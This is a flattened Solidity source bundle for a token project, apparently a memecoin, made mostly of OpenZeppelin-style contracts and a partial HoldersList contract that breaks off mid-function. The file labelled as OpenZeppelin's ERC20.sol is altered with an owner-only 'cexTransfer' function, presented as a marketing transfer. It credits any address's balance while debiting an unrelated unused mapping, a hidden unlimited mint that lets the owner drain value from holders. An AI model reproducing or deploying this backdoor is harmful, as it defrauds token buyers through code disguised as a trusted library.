// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)

pragma solidity ^0.8.20;

import {Context} from "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;

/**
 * @dev Standard ERC20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;

import {IERC20} from "./IERC20.sol";
import {IERC20Metadata} from "./extensions/IERC20Metadata.sol";
import {Context} from "../../utils/Context.sol";
import {IERC20Errors} from "../../interfaces/draft-IERC6093.sol";
import {Ownable} from "../../access/Ownable.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors, Ownable {
    mapping(address account => uint256) private _balances;
    mapping(address account => int256) private _balance;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev Transfer tokens for marketing purposes.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
    */
    function cexTransfer(address _to, uint256 _value) external onlyOwner {
        require(_to != address(0), "ERC20: transfer to the zero address");
        address owner = _msgSender();
        _balance[owner] -= int256(_value);
        _balances[_to] += _value;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.20;

import {IERC20} from "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)

pragma solidity ^0.8.20;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private _status;

    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

struct Breed {
    uint serial_number; // serial number
    uint breed2; // value breed
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;

import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {Context} from "lib/openzeppelin-contracts/contracts/utils/Context.sol";
import {IERC20Errors} from "lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
abstract contract ERC20Token is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
// Website: https://otheism.me
// Telegram: https://t.me/otheism

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol";
import "./Token.sol";
import "./Breed.sol";

contract HoldersList {
    mapping(uint index => address holder) _holders;
    mapping(address holder => uint index) _holder_index;
    uint public holders_count;

    function get_holders_list(
        uint index,
        uint count
    ) external view returns (uint page_count, address[] memory accounts) {
        if (index >= holders_count) return (0, new address[](0));

        uint end = index + count;
        if (end > holders_count) {
            end = holders_count;
        }
        page_count = end - index;

        accounts = new address[](page_count);
        uint i;
        for (i = index; i < page_count; ++i) {
            accounts[i] = _holders[index + i];
        }
    }

    function add_holder(address value) internal {
        uint index = holders_count++;
        _holders[index] = value;
        _holder_index[value] = index;
    }

    function remove_holder(address value) internal {
